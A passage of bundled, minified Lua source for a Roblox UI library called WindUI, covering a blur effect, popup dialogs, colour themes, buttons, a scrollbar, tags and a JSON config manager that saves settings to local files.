function ab.Enable()
for ae,af in pairs(ad)do
af.Enabled=false
end
ac.Parent=aa(game:GetService"Lighting")
end

function ab.Disable()
for ae,af in pairs(ad)do
af.Enabled=af.enabled
end
ac.Parent=nil
end

local function registerDefaults()
local function register(ae)
if ae:IsA"DepthOfFieldEffect"then
ad[ae]={enabled=ae.Enabled}
end
end

for ae,af in pairs(aa(game:GetService"Lighting"):GetChildren())do
register(af)
end

if aa(game:GetService"Workspace").CurrentCamera then
for ae,af in pairs(aa(game:GetService"Workspace").CurrentCamera:GetChildren())do
register(af)
end
end
end

registerDefaults()
ab.Enable()
end

return ab end function a.u()

local aa={}

local ab=a.load'd'
local ac=ab.New local ad=
ab.Tween


function aa.new(ae,af)
local ag={
Title=ae.Title or"Dialog",
Content=ae.Content,
Icon=ae.Icon,
IconThemed=ae.IconThemed,
Thumbnail=ae.Thumbnail,
Buttons=ae.Buttons,

IconSize=22,
}

local ah=a.load'o'
local ai=ah.Create(true,"Popup",ae.WindUI.Window,ae.WindUI,af)

local aj=200

local ak=430
if ag.Thumbnail and ag.Thumbnail.Image then
ak=430+(aj/2)
end

ai.UIElements.Main.AutomaticSize="Y"
ai.UIElements.Main.Size=UDim2.new(0,ak,0,0)



local al

if ag.Icon then
al=ab.Image(
ag.Icon,
ag.Title..":"..ag.Icon,
0,
ae.WindUI.Window,
"Popup",
true,
ae.IconThemed,
"PopupIcon"
)
al.Size=UDim2.new(0,ag.IconSize,0,ag.IconSize)
al.LayoutOrder=-1
end


local am=ac("TextLabel",{
AutomaticSize="Y",
BackgroundTransparency=1,
Text=ag.Title,
TextXAlignment="Left",
FontFace=Font.new(ab.Font,Enum.FontWeight.SemiBold),
ThemeTag={
TextColor3="PopupTitle",
},
TextSize=20,
TextWrapped=true,
Size=UDim2.new(1,al and-ag.IconSize-14 or 0,0,0)
})

local an=ac("Frame",{
BackgroundTransparency=1,
AutomaticSize="XY",
},{
ac("UIListLayout",{
Padding=UDim.new(0,14),
FillDirection="Horizontal",
VerticalAlignment="Center"
}),
al,am
})

local ao=ac("Frame",{
AutomaticSize="Y",
Size=UDim2.new(1,0,0,0),
BackgroundTransparency=1,
},{





an,
})

local ap
if ag.Content and ag.Content~=""then
ap=ac("TextLabel",{
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
TextXAlignment="Left",
Text=ag.Content,
TextSize=18,
TextTransparency=.2,
ThemeTag={
TextColor3="PopupContent",
},
BackgroundTransparency=1,
RichText=true,
TextWrapped=true,
})
end

local aq=ac("Frame",{
Size=UDim2.new(1,0,0,42),
BackgroundTransparency=1,
},{
ac("UIListLayout",{
Padding=UDim.new(0,9),
FillDirection="Horizontal",
HorizontalAlignment="Right"
})
})

local ar
if ag.Thumbnail and ag.Thumbnail.Image then
local as
if ag.Thumbnail.Title then
as=ac("TextLabel",{
Text=ag.Thumbnail.Title,
ThemeTag={
TextColor3="Text",
},
TextSize=18,
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
BackgroundTransparency=1,
AutomaticSize="XY",
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
})
end
ar=ac("ImageLabel",{
Image=ag.Thumbnail.Image,
BackgroundTransparency=1,
Size=UDim2.new(0,aj,1,0),
Parent=ai.UIElements.Main,
ScaleType="Crop"
},{
as,
ac("UICorner",{
CornerRadius=UDim.new(0,0),
})
})
end

ac("Frame",{

Size=UDim2.new(1,ar and-aj or 0,1,0),
Position=UDim2.new(0,ar and aj or 0,0,0),
BackgroundTransparency=1,
Parent=ai.UIElements.Main
},{
ac("Frame",{

Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
},{
ac("UIListLayout",{
Padding=UDim.new(0,18),
FillDirection="Vertical",
}),
ao,
ap,
aq,
ac("UIPadding",{
PaddingTop=UDim.new(0,16),
PaddingLeft=UDim.new(0,16),
PaddingRight=UDim.new(0,16),
PaddingBottom=UDim.new(0,16),
})
}),
})

local as=a.load'm'.New

for at,au in next,ag.Buttons do
as(au.Title,au.Icon,au.Callback,au.Variant,aq,ai)
end

ai:Open()


return ag
end

return aa end function a.v()
return function(aa,ab)
return{
Dark={
Name="Dark",

Accent=Color3.fromHex"#18181b",
Dialog=Color3.fromHex"#1a1a1a",
Outline=Color3.fromHex"#FFFFFF",
Text=Color3.fromHex"#FFFFFF",
Placeholder=Color3.fromHex"#a1a1a1",
Background=Color3.fromHex"#101010",
Button=Color3.fromHex"#52525b",
Icon=Color3.fromHex"#a1a1aa",
Toggle=Color3.fromHex"#33C759",
Slider=Color3.fromHex"#0091FF",
Checkbox=Color3.fromHex"#0091FF",

PanelBackground=Color3.fromHex"#FFFFFF",
PanelBackgroundTransparency=0.95,

SliderIcon=Color3.fromHex"#908F95",
Primary=Color3.fromHex"#0091FF",


LabelBackground=Color3.fromHex"#000000",
LabelBackgroundTransparency=0.83,

ElementBackground=Color3.fromHex"#2A2A2C",
ElementBackgroundTransparency=0,
},

Light={
Name="Light",

Accent=Color3.fromHex"#efefef",
Dialog=Color3.fromHex"#f4f4f5",
Outline=Color3.fromHex"#ffffff",
Text=Color3.fromHex"#000000",
Placeholder=Color3.fromHex"#555555",
Background=Color3.fromHex"#FFFFFF",
Button=Color3.fromHex"#18181b",
Icon=Color3.fromHex"#52525b",
Toggle=Color3.fromHex"#33C759",
Slider=Color3.fromHex"#0091FF",
Checkbox=Color3.fromHex"#0091FF",

DropdownTabBackground=Color3.fromHex"#bebebe",
DropdownBackground=Color3.fromHex"#ffffff",

TabBackground=Color3.fromHex"#ffffff",
TabBackgroundHover=Color3.fromHex"#f3f3f3",
TabBackgroundHoverTransparency=0,
TabBackgroundActive=Color3.fromHex"#efefef",
TabBackgroundActiveTransparency=0,

PanelBackground=Color3.fromHex"#efefef",
PanelBackgroundTransparency=0,

LabelBackground=Color3.fromHex"#efefef",
LabelBackgroundTransparency=0,

ElementBackground=Color3.fromHex"#ffffff",
ElementBackgroundTransparency=0,
},

Rose={
Name="Rose",

Accent=Color3.fromHex"#be185d",
Dialog=Color3.fromHex"#4c0519",

Text=Color3.fromHex"#fdf2f8",
Placeholder=Color3.fromHex"#d67aa6",
Background=Color3.fromHex"#1f0308",
Button=Color3.fromHex"#e95f74",
Icon=Color3.fromHex"#fb7185",

ElementBackground=Color3.fromHex"#381E23",
ElementBackgroundTransparency=0,
},

Plant={
Name="Plant",

Accent=Color3.fromHex"#166534",
Dialog=Color3.fromHex"#052e16",

Text=Color3.fromHex"#f0fdf4",
Placeholder=Color3.fromHex"#4fbf7a",
Background=Color3.fromHex"#0a1b0f",
Button=Color3.fromHex"#16a34a",
Icon=Color3.fromHex"#4ade80",

ElementBackground=Color3.fromHex"#28342A",
ElementBackgroundTransparency=0,
},

Red={
Name="Red",

Accent=Color3.fromHex"#991b1b",
Dialog=Color3.fromHex"#450a0a",

Text=Color3.fromHex"#fef2f2",
Placeholder=Color3.fromHex"#d95353",
Background=Color3.fromHex"#1c0606",
Button=Color3.fromHex"#dc2626",
Icon=Color3.fromHex"#ef4444",

ElementBackground=Color3.fromHex"#322221",
ElementBackgroundTransparency=0,
},

Indigo={
Name="Indigo",

Accent=Color3.fromHex"#3730a3",
Dialog=Color3.fromHex"#1e1b4b",

Text=Color3.fromHex"#f1f5f9",
Placeholder=Color3.fromHex"#7078d9",
Background=Color3.fromHex"#0f0a2e",
Button=Color3.fromHex"#4f46e5",
Icon=Color3.fromHex"#6366f1",

ElementBackground=Color3.fromHex"#282543",
ElementBackgroundTransparency=0,
},

Sky={
Name="Sky",

Accent=Color3.fromHex"#00d4ff",
Dialog=Color3.fromHex"#0a4d66",

Text=Color3.fromHex"#e6f7ff",
Placeholder=Color3.fromHex"#66b3cc",
Background=Color3.fromHex"#051a26",
Button=Color3.fromHex"#00a8cc",
Icon=Color3.fromHex"#2db8d9",

Toggle=Color3.fromHex"#00d9d9",
Slider=Color3.fromHex"#00d4ff",
Checkbox=Color3.fromHex"#00d4ff",

PanelBackground=Color3.fromHex"#0d3a47",
PanelBackgroundTransparency=0.8,

ElementBackground=Color3.fromHex"#172E3B",
ElementBackgroundTransparency=0,
},

Violet={
Name="Violet",

Accent=Color3.fromHex"#6d28d9",
Dialog=Color3.fromHex"#3c1361",

Text=Color3.fromHex"#faf5ff",
Placeholder=Color3.fromHex"#8f7ee0",
Background=Color3.fromHex"#1e0a3e",
Button=Color3.fromHex"#7c3aed",
Icon=Color3.fromHex"#8b5cf6",

ElementBackground=Color3.fromHex"#342650",
ElementBackgroundTransparency=0,
},

Amber={
Name="Amber",

Accent=aa:Gradient({
["0"]={Color=Color3.fromHex"#b45309",Transparency=0},
["100"]={Color=Color3.fromHex"#d97706",Transparency=0},
},{Rotation=45}),

Dialog=aa:Gradient({
["0"]={Color=Color3.fromHex"#451a03",Transparency=0},
["100"]={Color=Color3.fromHex"#6b2e05",Transparency=0},
},{Rotation=90}),






Text=aa:Gradient({
["0"]={Color=Color3.fromHex"#fffbeb",Transparency=0},
["100"]={Color=Color3.fromHex"#fff7ed",Transparency=0},
},{Rotation=45}),

Placeholder=aa:Gradient({
["0"]={Color=Color3.fromHex"#d1a326",Transparency=0},
["100"]={Color=Color3.fromHex"#fbbf24",Transparency=0},
},{Rotation=45}),

Background=aa:Gradient({
["0"]={Color=Color3.fromHex"#1c1003",Transparency=0},
["100"]={Color=Color3.fromHex"#3f210d",Transparency=0},
},{Rotation=90}),

Button=aa:Gradient({
["0"]={Color=Color3.fromHex"#d97706",Transparency=0},
["100"]={Color=Color3.fromHex"#f59e0b",Transparency=0},
},{Rotation=45}),

Icon=Color3.fromHex"#f59e0b",

Toggle=aa:Gradient({
["0"]={Color=Color3.fromHex"#d97706",Transparency=0},
["100"]={Color=Color3.fromHex"#f59e0b",Transparency=0},
},{Rotation=45}),

Slider=Color3.fromHex"#d97706",

Checkbox=aa:Gradient({
["0"]={Color=Color3.fromHex"#d97706",Transparency=0},
["100"]={Color=Color3.fromHex"#fbbf24",Transparency=0},
},{Rotation=45}),

PanelBackground=Color3.fromHex"#FFFFFF",
PanelBackgroundTransparency=0.95,

ElementBackground=Color3.fromHex"#3A2E22",
ElementBackgroundTransparency=0,
},

Emerald={
Name="Emerald",

Accent=Color3.fromHex"#047857",
Dialog=Color3.fromHex"#022c22",

Text=Color3.fromHex"#ecfdf5",
Placeholder=Color3.fromHex"#3fbf8f",
Background=Color3.fromHex"#011411",
Button=Color3.fromHex"#059669",
Icon=Color3.fromHex"#10b981",

ElementBackground=Color3.fromHex"#202E2A",
ElementBackgroundTransparency=0,
},

Midnight={
Name="Midnight",

Accent=Color3.fromHex"#1e3a8a",
Dialog=Color3.fromHex"#0c1e42",

Text=Color3.fromHex"#dbeafe",
Placeholder=Color3.fromHex"#2f74d1",
Background=Color3.fromHex"#0a0f1e",
Button=Color3.fromHex"#2563eb",
Primary=Color3.fromHex"#2563eb",
Icon=Color3.fromHex"#5591f4",

ElementBackground=Color3.fromHex"#242836",
ElementBackgroundTransparency=0,
},

Crimson={
Name="Crimson",

Accent=Color3.fromHex"#b91c1c",
Dialog=Color3.fromHex"#450a0a",

Text=Color3.fromHex"#fef2f2",
Placeholder=Color3.fromHex"#6f757b",
Background=Color3.fromHex"#0c0404",
Button=Color3.fromHex"#991b1b",
Icon=Color3.fromHex"#dc2626",

ElementBackground=Color3.fromHex"#251F1F",
ElementBackgroundTransparency=0,
},

MonokaiPro={
Name="Monokai Pro",

Accent=Color3.fromHex"#fc9867",
Dialog=Color3.fromHex"#1e1e1e",

Text=Color3.fromHex"#fcfcfa",
Placeholder=Color3.fromHex"#afafaf",
Background=Color3.fromHex"#191622",
Button=Color3.fromHex"#ab9df2",
Icon=Color3.fromHex"#a9dc76",

ElementBackground=Color3.fromHex"#323039",
ElementBackgroundTransparency=0,

Metadata={
PullRequest=23,
},
},

CottonCandy={
Name="Cotton Candy",

Accent=Color3.fromHex"#ec4899",
Dialog=Color3.fromHex"#2d1b3d",

Text=Color3.fromHex"#fdf2f8",
Placeholder=Color3.fromHex"#8a5fd3",
Background=Color3.fromHex"#1a0b2e",
Button=Color3.fromHex"#d946ef",
Slider=Color3.fromHex"#d946ef",
Icon=Color3.fromHex"#06b6d4",

ElementBackground=Color3.fromHex"#312643",
ElementBackgroundTransparency=0,
},

Mellowsi={
Name="Mellowsi",

Accent=Color3.fromHex"#342A1E",
Dialog=Color3.fromHex"#291C13",

Text=Color3.fromHex"#F5EBDD",
Placeholder=Color3.fromHex"#9C8A73",
Background=Color3.fromHex"#1C1002",
Button=Color3.fromHex"#342A1E",
Icon=Color3.fromHex"#C9B79C",

Toggle=Color3.fromHex"#a9873f",
Slider=Color3.fromHex"#C9A24D",
Checkbox=Color3.fromHex"#C9A24D",

ElementBackground=Color3.fromHex"#33291E",
ElementBackgroundTransparency=0,

Metadata={
PullRequest=52,
},
},

Rainbow={
Name="Rainbow",

Accent=aa:Gradient({
["0"]={Color=Color3.fromHex"#00ff41",Transparency=0},
["33"]={Color=Color3.fromHex"#00ffff",Transparency=0},
["66"]={Color=Color3.fromHex"#0080ff",Transparency=0},
["100"]={Color=Color3.fromHex"#8000ff",Transparency=0},
},{Rotation=45}),

Dialog=aa:Gradient({
["0"]={Color=Color3.fromHex"#ff0080",Transparency=0},
["25"]={Color=Color3.fromHex"#8000ff",Transparency=0},
["50"]={Color=Color3.fromHex"#0080ff",Transparency=0},
["75"]={Color=Color3.fromHex"#00ff80",Transparency=0},
["100"]={Color=Color3.fromHex"#ff8000",Transparency=0},
},{Rotation=135}),


Text=Color3.fromHex"#ffffff",
Placeholder=Color3.fromHex"#00ff80",

Background=aa:Gradient({
["0"]={Color=Color3.fromHex"#ff0040",Transparency=0},
["20"]={Color=Color3.fromHex"#ff4000",Transparency=0},
["40"]={Color=Color3.fromHex"#ffff00",Transparency=0},
["60"]={Color=Color3.fromHex"#00ff40",Transparency=0},
["80"]={Color=Color3.fromHex"#0040ff",Transparency=0},
["100"]={Color=Color3.fromHex"#4000ff",Transparency=0},
},{Rotation=90}),

Button=aa:Gradient({
["0"]={Color=Color3.fromHex"#ff0080",Transparency=0},
["25"]={Color=Color3.fromHex"#ff8000",Transparency=0},
["50"]={Color=Color3.fromHex"#ffff00",Transparency=0},
["75"]={Color=Color3.fromHex"#80ff00",Transparency=0},
["100"]={Color=Color3.fromHex"#00ffff",Transparency=0},
},{Rotation=60}),

Icon=Color3.fromHex"#ffffff",
},
}
end end function a.w()

local aa={}

local ab=a.load'd'
local ac=ab.New local ad=
ab.Tween

function aa.New(ae,af,ag,ah,ai,aj)
local ak=ai or 10
local al
if af and af~=""then
al=ac("ImageLabel",{
Image=ab.Icon(af)[1],
ImageRectSize=ab.Icon(af)[2].ImageRectSize,
ImageRectOffset=ab.Icon(af)[2].ImageRectPosition,
Size=UDim2.new(0,21,0,21),
BackgroundTransparency=1,
ThemeTag={
ImageColor3="Icon",
},
})
end

local am=ac("TextLabel",{
BackgroundTransparency=1,
TextSize=17,
FontFace=Font.new(ab.Font,Enum.FontWeight.Regular),
Size=UDim2.new(1,al and-29 or 0,1,0),
TextXAlignment="Left",
ThemeTag={
TextColor3=ah and"Placeholder"or"Text",
},
Text=ae,
})

local an=ac("TextButton",{
Size=UDim2.new(1,0,0,42),
Parent=ag,
BackgroundTransparency=1,
Text="",
},{
ac("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
},{
ab.NewRoundFrame(ak,"Squircle",{
ThemeTag={
ImageColor3="Placeholder",
},
Size=UDim2.new(1,0,1,0),
ImageTransparency=0.85,
}),
not aj and ab.NewRoundFrame(ak,"SquircleGlass",{
ThemeTag={
ImageColor3="Outline",
},
Size=UDim2.new(1,1,1,1),
ImageTransparency=0.9,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
})or nil,
ab.NewRoundFrame(ak,"Squircle",{
Size=UDim2.new(1,0,1,0),
Name="Frame",
ThemeTag={
ImageColor3="LabelBackground",
ImageTransparency="LabelBackgroundTransparency",
},


},{
ac("UIPadding",{
PaddingLeft=UDim.new(0,12),
PaddingRight=UDim.new(0,12),
}),
ac("UIListLayout",{
FillDirection="Horizontal",
Padding=UDim.new(0,8),
VerticalAlignment="Center",
HorizontalAlignment="Left",
}),
al,
am,
}),
}),
})

return an
end

return aa end function a.x()

local aa={}

local ab=cloneref or clonereference or function(ab)
return ab
end
local ac=ab(game:GetService"UserInputService")

local ad=a.load'd'
local ae=ad.New

function aa.New(af,ag,ah,ai,aj)
local ak=ae("Frame",{
Size=UDim2.new(0,ai,1,0),
BackgroundTransparency=1,
Position=UDim2.new(1,0,0,0),
AnchorPoint=Vector2.new(1,0),
Parent=ag,
ZIndex=999,
Active=true,
})

local al=ad.NewRoundFrame(ai/2,"Squircle",{
Size=UDim2.new(1,0,0,0),
ImageTransparency=0.85,
ThemeTag={ImageColor3="Text"},
Parent=ak,
})

local am=ae("Frame",{
Size=UDim2.new(1,12,1,12),
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
BackgroundTransparency=1,
Active=true,
ZIndex=999,
Parent=al,
})

local an=ad:GenerateUniqueID()
local ao=false
local ap,aq

local function UpdateVisuals()
local ar=af.AbsoluteCanvasSize.Y
local as=af.AbsoluteWindowSize.Y

if ar<=as then
al.Visible=false
return
end

al.Visible=true

local at=math.clamp(as/ar,0.05,1)
al.Size=UDim2.new(1,0,at,0)

local au=ar-as
local av=1-at

if au>0 then
local aw=af.CanvasPosition.Y/au
al.Position=UDim2.new(0,0,math.clamp(aw*av,0,av),0)
else
al.Position=UDim2.new(0,0,0,0)
end
end

local function StopDrag()
if aj.CurrentInput==an then
aj.CurrentInput=nil
end
ao=false
af.ScrollingEnabled=true
if ap then
ap:Disconnect()
end
if aq then
aq:Disconnect()
end
end

ad.AddSignal(am.InputBegan,function(ar)
if
ar.UserInputType~=Enum.UserInputType.MouseButton1
and ar.UserInputType~=Enum.UserInputType.Touch
then
return
end
if ao then
return
end
if aj.CurrentInput and aj.CurrentInput~=an then
return
end

aj.CurrentInput=an

ao=true
af.ScrollingEnabled=false

local as=ar.Position.Y
local at=af.CanvasPosition.Y

ap=ac.InputChanged:Connect(function(au)
if
au.UserInputType==Enum.UserInputType.MouseMovement
or au.UserInputType==Enum.UserInputType.Touch
then
local av=au.Position.Y-as

local aw=af.AbsoluteCanvasSize.Y
local ax=af.AbsoluteWindowSize.Y
local ay=math.max(aw-ax,0)

local az=ak.AbsoluteSize.Y
local aA=al.AbsoluteSize.Y
local aB=math.max(az-aA,1)

local b=av*(ay/aB)

af.CanvasPosition=
Vector2.new(af.CanvasPosition.X,math.clamp(at+b,0,ay))
end
end)

aq=ac.InputEnded:Connect(function(au)
if au.UserInputType==ar.UserInputType then
if aj.CurrentInput and aj.CurrentInput~=an then
return
end

aj.CurrentInput=nil

StopDrag()
end
end)
end)

ad.AddSignal(af:GetPropertyChangedSignal"AbsoluteWindowSize",UpdateVisuals)
ad.AddSignal(af:GetPropertyChangedSignal"AbsoluteCanvasSize",UpdateVisuals)
ad.AddSignal(af:GetPropertyChangedSignal"CanvasPosition",UpdateVisuals)

UpdateVisuals()

return ak
end

return aa end function a.y()

local aa={}

local ab=a.load'd'
local ac=ab.New
local ad=ab.Tween

function aa.New(ae,af,ag)
local ah={
Title=af.Title or"Tag",
Icon=af.Icon,
Color=af.Color or Color3.fromHex"#315dff",
Radius=af.Radius or 999,
Border=af.Border or false,

TagFrame=nil,
Height=26,
Padding=10,
TextSize=14,
IconSize=16,
}

local ai
if ah.Icon then
ai=ab.Image(ah.Icon,ah.Icon,0,af.Window,"Tag",false)

ai.Size=UDim2.new(0,ah.IconSize,0,ah.IconSize)
ai.ImageLabel.ImageColor3=typeof(ah.Color)=="Color3"
and ab.GetTextColorForHSB(ah.Color)
or typeof(ah.Color)=="string"
and(ab.GetTextColorForHSB(ab.GetThemeProperty(ah.Color,ab.Theme)))
end

local aj=ac("TextLabel",{
BackgroundTransparency=1,
AutomaticSize="XY",
TextSize=ah.TextSize,
FontFace=Font.new(ab.Font,Enum.FontWeight.SemiBold),
Text=ah.Title,
TextColor3=typeof(ah.Color)=="Color3"and ab.GetTextColorForHSB(ah.Color)or typeof(
ah.Color
)=="string"and(ab.GetTextColorForHSB(ab.GetThemeProperty(ah.Color,ab.Theme))),
})

local ak

if typeof(ah.Color)=="table"then
ak=ac"UIGradient"
for al,am in next,ah.Color do
ak[al]=am
end

aj.TextColor3=ab.GetTextColorForHSB(ab.GetAverageColor(ak))
if ai then
ai.ImageLabel.ImageColor3=ab.GetTextColorForHSB(ab.GetAverageColor(ak))
end
end

local al=ab.NewRoundFrame(ah.Radius,"Squircle",{
AutomaticSize="X",
Size=UDim2.new(0,0,0,ah.Height),
Parent=ag,
ImageColor3=typeof(ah.Color)=="Color3"and ah.Color
or typeof(ah.Color)=="table"and Color3.new(1,1,1)
or nil,
ThemeTag=typeof(ah.Color)=="string"and{
ImageColor3=ah.Color,
},
},{
ak,
ab.NewRoundFrame(ah.Radius+1,"SquircleGlass",{
Size=UDim2.new(1,1,1,1),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
ThemeTag={
ImageColor3="White",
},
ImageTransparency=0.75,
}),
ac("Frame",{
Size=UDim2.new(0,0,1,0),
AutomaticSize="X",
Name="Content",
BackgroundTransparency=1,
},{
ai,
aj,
ac("UIPadding",{
PaddingLeft=UDim.new(0,ah.Padding),
PaddingRight=UDim.new(0,ah.Padding),
}),
ac("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
Padding=UDim.new(0,ah.Padding/1.5),
}),
}),
})

function ah.SetTitle(am,an)
ah.Title=an
aj.Text=an

return ah
end

function ah.SetColor(am,an)
ah.Color=an
if typeof(an)=="table"then
local ao=ab.GetAverageColor(an)
ad(aj,0.06,{TextColor3=ab.GetTextColorForHSB(ao)}):Play()
local ap=al:FindFirstChildOfClass"UIGradient"or ac("UIGradient",{Parent=al})
for aq,ar in next,an do
ap[aq]=ar
end
ad(al,0.06,{ImageColor3=Color3.new(1,1,1)}):Play()
else
if ak then
ak:Destroy()
end
ad(aj,0.06,{TextColor3=ab.GetTextColorForHSB(an)}):Play()
if ai then
ad(ai.ImageLabel,0.06,{ImageColor3=ab.GetTextColorForHSB(an)}):Play()
end
ad(al,0.06,{ImageColor3=an}):Play()
end

return ah
end

function ah.SetIcon(am,an)
ah.Icon=an

if an then
ai=ab.Image(an,an,0,af.Window,"Tag",false)

ai.Size=UDim2.new(0,ah.IconSize,0,ah.IconSize)
ai.Parent=al

if typeof(ah.Color)=="Color3"then
ai.ImageLabel.ImageColor3=ab.GetTextColorForHSB(ah.Color)
elseif typeof(ah.Color)=="table"then
ai.ImageLabel.ImageColor3=ab.GetTextColorForHSB(ab.GetAverageColor(ak))
end
else
if ai then
ai:Destroy()
ai=nil
end
end
return ah
end

function ah.Destroy(am)
al:Destroy()
return ah
end

ab:OnThemeChange(function(am,an)
aj.TextColor3=ab.GetTextColorForHSB(ab.GetThemeProperty(ah.Color,ab.Theme))
ai.ImageLabel.ImageColor3=
ab.GetTextColorForHSB(ab.GetThemeProperty(ah.Color,ab.Theme))
end)

return ah
end

return aa end function a.z()

local aa=(cloneref or clonereference or function(aa)return aa end)


local ab=aa(game:GetService"RunService")
local ac=aa(game:GetService"HttpService")

local ad

local ae
ae={
Folder=nil,
Path=nil,
Configs={},
Parser={
Colorpicker={
Save=function(af)
return{
__type=af.__type,
value=af.Default:ToHex(),
transparency=af.Transparency or nil,
}
end,
Load=function(af,ag)
if af and af.Update then
af:Update(Color3.fromHex(ag.value),ag.transparency or nil)
end
end
},
Dropdown={
Save=function(af)
return{
__type=af.__type,
value=af.Value,
}
end,
Load=function(af,ag)
if af and af.Select then
af:Select(ag.value)
end
end
},
Input={
Save=function(af)
return{
__type=af.__type,
value=af.Value,
}
end,
Load=function(af,ag)
if af and af.Set then
af:Set(ag.value)
end
end
},
Keybind={
Save=function(af)
return{
__type=af.__type,
value=af.Value,
}
end,
Load=function(af,ag)
if af and af.Set then
af:Set(ag.value)
end
end
},
Slider={
Save=function(af)
return{
__type=af.__type,
value=af.Value.Default,
}
end,
Load=function(af,ag)
if af and af.Set then
af:Set(tonumber(ag.value))
end
end
},
Toggle={
Save=function(af)
return{
__type=af.__type,
value=af.Value,
}
end,
Load=function(af,ag)
if af and af.Set then
af:Set(ag.value)
end
end
},
}
}

function ae.Init(af,ag)
if not ag.Folder then
warn"[ WindUI.ConfigManager ] Window.Folder is not specified."
return false
end
if ab:IsStudio()or not writefile then
warn"[ WindUI.ConfigManager ] The config system doesn't work in the studio."
return false
end

ad=ag
ae.Folder=ad.Folder
ae.Path="WindUI/"..tostring(ae.Folder).."/config/"

if not isfolder(ae.Path)then
makefolder(ae.Path)
end

local ah=ae:AllConfigs()

for ai,aj in next,ah do
if isfile and readfile and isfile(aj..".json")then
ae.Configs[aj]=readfile(aj..".json")
end
end

return ae
end

function ae.SetPath(af,ag)
if not ag then
warn"[ WindUI.ConfigManager ] Custom path is not specified."
return false
end

ae.Path=ag
if not ag:match"/$"then
ae.Path=ag.."/"
end

if not isfolder(ae.Path)then
makefolder(ae.Path)
end

return true
end

function ae.CreateConfig(af,ag,ah)
local ai={
Path=ae.Path..ag..".json",
Elements={},
CustomData={},
AutoLoad=ah or false,
Version=1.2,
}

if not ag then
return false,"No config file is selected"
end

function ai.SetAsCurrent(aj)
ad:SetCurrentConfig(ai)
end

function ai.Register(aj,ak,al)
ai.Elements[ak]=al
end

function ai.Set(aj,ak,al)
ai.CustomData[ak]=al
end

function ai.Get(aj,ak)
return ai.CustomData[ak]
end

function ai.SetAutoLoad(aj,ak)
ai.AutoLoad=ak
end

function ai.Save(aj)
if ad.PendingFlags then
for ak,al in next,ad.PendingFlags do
ai:Register(ak,al)
end
end

local ak={
__version=ai.Version,
__elements={},
__autoload=ai.AutoLoad,
__custom=ai.CustomData
}

for al,am in next,ai.Elements do
if ae.Parser[am.__type]then
ak.__elements[tostring(al)]=ae.Parser[am.__type].Save(am)
end
end

local al=ac:JSONEncode(ak)
if writefile then
writefile(ai.Path,al)
end

return ak
end

function ai.Load(aj)
if isfile and not isfile(ai.Path)then
return false,"Config file does not exist"
end

local ak,al=pcall(function()
local ak=readfile or function()
warn"[ WindUI.ConfigManager ] The config system doesn't work in the studio."
return nil
end
return ac:JSONDecode(ak(ai.Path))
end)

if not ak then
return false,"Failed to parse config file"
end

if not al.__version then
local am={
__version=ai.Version,
__elements=al,
__custom={}
}
al=am
end

if ad.PendingFlags then
for am,an in next,ad.PendingFlags do
ai:Register(am,an)
end
end

for am,an in next,(al.__elements or{})do
if ai.Elements[am]and ae.Parser[an.__type]then
task.spawn(function()
ae.Parser[an.__type].Load(ai.Elements[am],an)
end)
end
end

ai.CustomData=al.__custom or{}

return ai.CustomData
end

function ai.Delete(aj)
if not delfile then
return false,"delfile function is not available"
end

if not isfile(ai.Path)then
return false,"Config file does not exist"
end

local ak,al=pcall(function()
delfile(ai.Path)
end)

if not ak then
return false,"Failed to delete config file: "..tostring(al)
end

ae.Configs[ag]=nil

if ad.CurrentConfig==ai then
ad.CurrentConfig=nil
end

return true,"Config deleted successfully"
end

function ai.GetData(aj)
return{
elements=ai.Elements,
custom=ai.CustomData,
autoload=ai.AutoLoad
}
end


if isfile(ai.Path)then
local aj,ak=pcall(function()
return ac:JSONDecode(readfile(ai.Path))
end)

if aj and ak and ak.__autoload then
ai.AutoLoad=true

task.spawn(function()
task.wait(0.5)
local al,am=pcall(function()
return ai:Load()
end)
if al then
if ad.Debug then print("[ WindUI.ConfigManager ] AutoLoaded config: "..ag)end
else
warn("[ WindUI.ConfigManager ] Failed to AutoLoad config: "..ag.." - "..tostring(am))
end
end)
end
end


ai:SetAsCurrent()
ae.Configs[ag]=ai
return ai
end

function ae.Config(af,ag,ah)
return ae:CreateConfig(ag,ah)
end

function ae.GetAutoLoadConfigs(af)
local ag={}

for ah,ai in pairs(ae.Configs)do
if ai.AutoLoad then
table.insert(ag,ah)
end
end

return ag
end

function ae.DeleteConfig(af,ag)
if not delfile then
return false,"delfile function is not available"
end

local ah=ae.Path..ag..".json"

if not isfile(ah)then
return false,"Config file does not exist"
end

local ai,aj=pcall(function()
delfile(ah)
end)

if not ai then
return false,"Failed to delete config file: "..tostring(aj)
end

ae.Configs[ag]=nil

if ad.CurrentConfig and ad.CurrentConfig.Path==ah then
ad.CurrentConfig=nil
end

return true,"Config deleted successfully"
end

function ae.AllConfigs(af)
if not listfiles then return{}end

local ag={}
if not isfolder(ae.Path)then
makefolder(ae.Path)
return ag
end

for ah,ai in next,listfiles(ae.Path)do
local aj=ai:match"([^\\/]+)%.json$"
if aj then
table.insert(ag,aj)
end
end

return ag
end

function ae.GetConfig(af,ag)
return ae.Configs[ag]
end

return ae end function a.A()
local aa={}

local ab=a.load'd'
local ac=ab.New
local ad=ab.Tween


local ae=(cloneref or clonereference or function(ae)return ae end)


ae(game:GetService"UserInputService")


function aa.New(af)
local ag={
Button=nil
}

local ah













local ai=ac("TextLabel",{
Text=af.Title,
TextSize=17,
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
BackgroundTransparency=1,
AutomaticSize="XY",
})

local aj=ac("Frame",{
Size=UDim2.new(0,36,0,36),
BackgroundTransparency=1,
Name="Drag",
},{
ac("ImageLabel",{
Image=ab.Icon"move"[1],
ImageRectOffset=ab.Icon"move"[2].ImageRectPosition,
ImageRectSize=ab.Icon"move"[2].ImageRectSize,
Size=UDim2.new(0,18,0,18),
BackgroundTransparency=1,
Position=UDim2.new(0.5,0,0.5,0),
